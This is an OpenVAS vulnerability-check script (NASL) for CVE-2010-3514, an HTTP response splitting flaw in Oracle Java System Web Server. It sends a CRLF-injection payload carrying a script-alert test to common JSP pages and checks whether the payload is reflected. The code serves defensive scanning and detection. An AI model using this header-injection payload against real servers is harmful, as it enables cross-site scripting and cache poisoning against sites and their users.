###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_sjs_web_server_response_splitting_vuln.nasl 8485 2018-01-22 07:57:57Z teissa $
#
# Oracle Java System Web Server HTTP Response Splitting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to conduct Cross Site
  Scripting and browser cache poisoning attacks.
  Impact Level: Application";
tag_affected = "Oracle Java System Web Server 6.x/7.x";
tag_insight = "The flaw is due to input validation error in 'response.setHeader()'
  method which is not properly sanitising before being returned to the user.
  This can be exploited to insert arbitrary HTTP headers, which will be
  included in a response sent to the user.";
tag_solution = "Apply the patch from below link,
  http://sunsolve.sun.com/search/document.do?assetkey=1-79-1215353.1-1";
tag_summary = "The host is running Oracle Java System Web Server and is prone to
  HTTP response splitting vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801532");
  script_version("$Revision: 8485 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-22 08:57:57 +0100 (Mon, 22 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_cve_id("CVE-2010-3514");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Oracle Java System Web Server HTTP Response Splitting Vulnerability");
  script_xref(name : "URL" , value : "http://inj3ct0r.com/exploits/14530");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15290/");
  script_xref(name : "URL" , value : "http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html#AppendixSUNS");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("SunWWW/banner");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");

## Get the host name
host = get_host_name();

## Get HTTP ports
jswsPort = get_http_port(default:80);
if(!jswsPort){
  exit(0);
}

if(get_port_state(jswsPort))
{
  banner = get_http_banner(port:jswsPort);
  ## Confirm the server
  if("Server: Sun-" >< banner)
  {
    ## checking for possible default files
    foreach files (make_list("login.jsp", "index.jsp", "default.jsp", "admin.jsp"))
    {
      ## Construct the attack request
      url = string("/" ,files , "?ref=http://" , host ,
              "/%0D%0AContent-type:+text/html;%0D%0A%0D%0ATEST%3Cscript%3Ealert" +
              "(111)%3C/script%3E");

      ## Construct the http request
      req = http_get(item:url, port:jswsPort);
      resp = http_send_recv(port: jswsPort, data: req);

      ## Confirm the HTTP response splitting
      if(egrep(string:resp, pattern:"^HTTP/1\..*200 OK") &&
         ("TEST<script>alert(111)</script>" >< resp))
      {
        security_message(jswsPort);
        exit(0);
      }
    }
  }
}
